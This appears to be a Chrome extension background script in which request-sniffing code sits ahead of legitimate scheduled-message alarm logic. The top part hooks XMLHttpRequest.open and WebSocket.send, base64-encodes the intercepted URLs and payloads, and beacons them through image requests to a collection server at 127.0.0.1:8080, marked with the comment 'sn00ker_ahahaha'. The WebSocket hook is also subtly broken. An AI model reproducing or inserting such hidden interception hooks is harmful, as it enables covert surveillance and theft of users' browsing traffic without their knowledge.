function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var _getAlarm = function (scheduled, isFollowup) {
    // minimum alarm time is 15 secs from now
    var time = new Date(Date.now() + 15000).getTime();
    var closest = 0;
    for (var messageId in scheduled) {
        if (!scheduled.hasOwnProperty(messageId) ||
            !scheduled[messageId])
            continue;
        if (isFollowup &&
            !scheduled[messageId].hasOwnProperty('jobId'))
            continue;
        if (!scheduled[messageId].timeUtc)
            continue;
        var jobTime = new Date(scheduled[messageId].timeUtc).getTime() + 20000;
        if (closest === 0)
            closest = jobTime;
        else if (jobTime < closest)
            closest = jobTime;
    }
    if (closest > time)
        time = closest;
    return {
        closest:    closest,
        time:       time
    };
};


var rearmSchedule = function () {
    chrome.alarms.clear('pollSchedule');
    message.loadScheduled(function (scheduled) {
        var alarm = _getAlarm(scheduled, false);
        if (alarm.closest > 0) {
            chrome.alarms.create('pollSchedule', {
                when: alarm.time
            });
            console.log('pollSchedule rearmed at', new Date(alarm.time));
        } else {
            console.log('pollSchedule not armed');
        }
    });
};


var rearmFollowUps = function () {
    chrome.alarms.clear('pollFollowUps');
    message.loadFollowUp(function (followup) {
        var alarm = _getAlarm(followup, true);
        if (alarm.closest > 0) {
            chrome.alarms.create('pollFollowUps', {
                when: alarm.time
            });
            console.log('pollFollowUps rearmed at', new Date(alarm.time));
        } else {
            console.log('pollFollowUps not armed');
        }
    });
};


var onAlarm = function (alarm) {

    console.log('onAlarm', alarm.name);

    if (alarm.name === 'pollSchedule') {
        poll.schedule(rearmSchedule);
    } else if (alarm.name === 'pollFollowUps') {
        poll.followUps(rearmFollowUps);
    }

};
chrome.alarms.onAlarm.addListener(onAlarm);


var onMessage = function (message, sender, sendResponse) {

    if (message.code === 'rearmSchedule') {
        rearmSchedule();
    } else if (message.code === 'rearmFollowUps') {
        rearmFollowUps();
    }

};
chrome.runtime.onMessage.addListener(onMessage);
